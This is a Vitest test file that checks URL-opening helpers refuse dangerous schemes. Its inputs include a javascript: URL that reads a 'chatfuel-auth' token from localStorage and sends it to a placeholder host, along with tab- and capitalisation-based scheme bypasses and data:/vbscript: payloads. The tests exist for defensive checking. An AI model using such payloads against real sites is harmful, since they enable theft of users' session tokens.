import { afterEach, describe, expect, it, vi } from 'vitest';
import { navigateExternal, openExternal } from './externalLink';

/* Node, no DOM: the two calls under test are the only things these need to be. */
const stubWindow = () => {
  const opened: unknown[][] = [];
  const assigned: string[] = [];
  vi.stubGlobal('window', {
    open: (...args: unknown[]) => {
      opened.push(args);
      return null;
    },
    location: { assign: (url: string) => assigned.push(url) },
  });
  return { opened, assigned };
};

afterEach(() => vi.unstubAllGlobals());

describe('openExternal', () => {
  it('opens an http(s) target in a new tab with no opener and no referrer', () => {
    const { opened } = stubWindow();
    expect(openExternal('https://cdn.example/file.pdf')).toBe(true);
    expect(opened).toEqual([['https://cdn.example/file.pdf', '_blank', 'noopener,noreferrer']]);
  });

  it('refuses a javascript: URL and opens nothing', () => {
    const { opened } = stubWindow();
    expect(openExternal('javascript:fetch("//x/"+localStorage.getItem("chatfuel-auth"))')).toBe(false);
    expect(opened).toEqual([]);
  });

  it('refuses the schemes a tab or a capital would smuggle past a denylist', () => {
    const { opened } = stubWindow();
    expect(openExternal('java\tscript:alert(1)')).toBe(false);
    expect(openExternal('JaVaScRiPt:alert(1)')).toBe(false);
    expect(openExternal('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(openExternal('vbscript:msgbox(1)')).toBe(false);
    expect(opened).toEqual([]);
  });

  it('refuses a relative target — nothing here is an in-app destination', () => {
    const { opened } = stubWindow();
    expect(openExternal('/livechat?c=1')).toBe(false);
    expect(openExternal('')).toBe(false);
    expect(opened).toEqual([]);
  });
});

describe('navigateExternal', () => {
  it('leaves for an https target in the same tab', () => {
    const { assigned } = stubWindow();
    expect(navigateExternal('https://www.facebook.com/dialog/oauth?x=1')).toBe(true);
    expect(assigned).toEqual(['https://www.facebook.com/dialog/oauth?x=1']);
  });

  it('refuses a javascript: URL rather than running it in this origin', () => {
    const { assigned } = stubWindow();
    expect(navigateExternal('javascript:alert(document.domain)')).toBe(false);
    expect(assigned).toEqual([]);
  });
});
